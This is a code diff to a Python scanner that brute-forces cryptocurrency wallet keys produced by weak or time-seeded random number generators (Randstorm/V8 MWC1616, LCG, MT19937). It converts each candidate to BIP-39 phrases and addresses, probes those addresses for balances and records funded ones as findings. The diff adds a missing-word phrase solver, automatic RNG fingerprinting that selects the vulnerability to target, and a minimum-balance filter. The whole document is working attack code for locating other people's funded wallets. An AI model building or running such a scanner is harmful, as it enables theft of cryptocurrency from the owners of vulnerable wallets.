@@ -1,4 +1,4 @@
-"""Scan Engine (V5) — search-space orchestration over weak PRNG simulators.
+"""Scan Engine (V5.1) — unified pipeline: RNG sims × constraints × fingerprinting × balances.
 
 Pipeline per candidate:
 
@@ -33,10 +33,26 @@ from typing import Dict, Iterable, List, Optional, Tuple
 import numpy as np
 
 import bip39
+import constraints as cons
+import fingerprint as fpmod
 import hd
 import lcg
 import mwc1616
 from balance import BalanceChecker
+
+
+class _FpFilter(cons.Constraint):
+    """Heuristic entropy fingerprint gate (bucket/parity) — LOSSY."""
+    def __init__(self, buckets, parity):
+        self.buckets = set(buckets) if buckets is not None else None
+        self.parity = parity
+
+    def accepts_entropy(self, entropy16: bytes) -> bool:
+        return fpmod.matches_fingerprint(entropy16, self.buckets, self.parity)
+
+    def describe(self) -> dict:
+        return {"type": "fp_filter", "buckets": sorted(self.buckets or []),
+                "parity": self.parity}
 
 
 # ---------------------------------------------------------------- findings
@@ -82,6 +98,12 @@ class ScanConfig:
     max_candidates: int = 0          # 0 => unlimited
     stop_on_hit: bool = False
     partial_words: Optional[Tuple[int, ...]] = None   # gap positions (BIP-39)
+    known_phrase: str = ""           # "w1 w2 ? w4 …" (?/* = missing word)
+    auto_fingerprint: bool = False   # classify sample & pick vuln/variant
+    fingerprint_sample_hex: str = ""  # observed weak-RNG bytes (classify input)
+    buckets: Optional[Tuple[int, ...]] = None   # REDUCED-coverage pre-filter
+    parity: Optional[int] = None                # REDUCED-coverage pre-filter
+    min_sat: int = 1                            # report threshold
 
     @staticmethod
     def from_years(y0: int, y1: int, **kw) -> "ScanConfig":
@@ -100,6 +122,9 @@ class ScanStats:
     bloom_skips: int = 0
     network_probes: int = 0
     hits: int = 0
+    constraint_rejects: int = 0
+    reduced_coverage: bool = False
+    coverage_keeps: float = 1.0
     finished: bool = False
     stopped: bool = False
 
@@ -127,6 +152,32 @@ class ScanEngine:
     def __init__(self, cfg: ScanConfig, checker: BalanceChecker):
         self.cfg = cfg
         self.checker = checker
+        # --- V5.1: constraint solver wiring ------------------------------
+        parts: list[cons.Constraint] = []
+        if cfg.known_phrase.strip():
+            known, gaps = cons.parse_partial_phrase(cfg.known_phrase)
+            parts.append(cons.MissingWordConstraint(known, gaps))
+            cfg.partial_words = gaps or cfg.partial_words
+        if cfg.buckets is not None or cfg.parity is not None:
+            parts.append(_FpFilter(cfg.buckets, cfg.parity))
+        self.constraint = cons.CompositeConstraint(parts) if parts else None
+        # --- V5.1: fingerprint-driven auto-config ------------------------
+        self.fingerprint_report = None
+        if cfg.auto_fingerprint and cfg.fingerprint_sample_hex:
+            self.fingerprint_report = fpmod.classify_stream(
+                bytes.fromhex(cfg.fingerprint_sample_hex))
+            if self.fingerprint_report.best:
+                vuln, variant = fpmod.family_to_scan_args(
+                    self.fingerprint_report.best.family)
+                cfg.vuln = vuln
+                if variant:
+                    cfg.lcg_variant = variant
+        # --- V5.1: prune plan (honest coverage bookkeeping) --------------
+        self.prune_plan = fpmod.build_prune_plan(
+            cfg.vuln, cfg.mode, cfg.t_start_ms, cfg.t_stop_ms,
+            buckets=cfg.buckets, parity=cfg.parity)
+        self.stats_extra_note = ("REDUCED COVERAGE"
+                                 if not self.prune_plan.lossless else "")
         self.findings: List[Finding] = []
         self.stats = ScanStats()
         self._stop = threading.Event()
@@ -157,6 +208,17 @@ class ScanEngine:
     # -- main loop ---------------------------------------------------------
     def _run(self) -> None:
         try:
+            self.stats.reduced_coverage = not self.prune_plan.lossless
+            self.stats.coverage_keeps = self.prune_plan.total_keeps
+            # Constraint-guided lane: when a GENERATING constraint exists
+            # (e.g. missing-word phrase), enumerate ITS solution space and
+            # probe each survivor — this is the search-space reduction:
+            # 2^128 entropy space collapses to ~128 checksum-valid candidates.
+            if self.constraint is not None and \
+                    any(p.generating for p in self.constraint.parts):
+                self._sweep_constrained()
+                self.stats.finished = not self.stats.stopped
+                return
             if self.cfg.vuln == "randstorm":
                 self._sweep_randstorm()
             elif self.cfg.vuln == "lcg":
@@ -187,6 +249,31 @@ class ScanEngine:
             except Exception:
                 pass
 
+    # -- constraint-guided sweep (missing words etc.) -----------------------
+    def _sweep_constrained(self) -> None:
+        c = self.cfg
+        for buf in self.constraint.generate():
+            if not self._budget_ok():
+                break
+            self.stats.candidates += 1
+            src = f"constraint/{c.vuln}"
+            if c.mode == "bip39":
+                self._probe_bip39(buf, 0, src)
+            else:
+                self._probe_direct(buf, 0, src)
+        if self.on_progress:
+            self.stats.elapsed = time.time() - self.stats.started
+            self.on_progress(self.stats)
+
+    def _fp_gate(self, buf: bytes) -> bool:
+        """Apply heuristic/fingerprint filters; count rejections."""
+        if self.constraint is None:
+            return True
+        if self.constraint.accepts_entropy(buf[:16]):
+            return True
+        self.stats.constraint_rejects += 1
+        return False
+
     # -- Randstorm (V8 MWC1616) --------------------------------------------
     def _sweep_randstorm(self) -> None:
         c = self.cfg
@@ -206,6 +293,8 @@ class ScanEngine:
             words = np.stack([batch.step() for _ in range(9)], axis=1)
             rows = self._words_to_buffers(words)
             for lane_i, buf in enumerate(rows):
+                if not self._fp_gate(buf):
+                    continue
                 self.stats.candidates += 1
                 tm = ts[lane_i]
                 if c.mode == "direct":
@@ -241,6 +330,8 @@ class ScanEngine:
         t = t0
         while t < t1 and self._budget_ok():
             for buf in lcg.time_seed_lcg(t, c.lcg_variant):
+                if not self._fp_gate(buf):
+                    continue
                 self.stats.candidates += 1
                 src = f"lcg/{c.lcg_variant}"
                 if c.mode == "direct":
@@ -264,6 +355,8 @@ class ScanEngine:
             # historical vulnerable path: one rng() call PER BYTE (low byte of
             # each tempered output) — exactly ref_entropy_buffer's semantics.
             buf = mt19937.ref_entropy_buffer(sec & 0xFFFFFFFF)
+            if not self._fp_gate(buf):
+                continue
             self.stats.candidates += 1
             if c.mode == "direct":
                 self._probe_direct(buf, sec * 1000, "mt19937/std")
@@ -303,7 +396,7 @@ class ScanEngine:
         hit_addrs = {r.address: r for r in res_list}
         for k in keys:
             r = hit_addrs.get(k.address)
-            if r is None:
+            if r is None or r.confirmed + r.unconfirmed < self.cfg.min_sat:
                 continue
             f = dataclasses.replace(base, chain_tag=k.chain_tag,
                                     address=k.address, style=k.style,
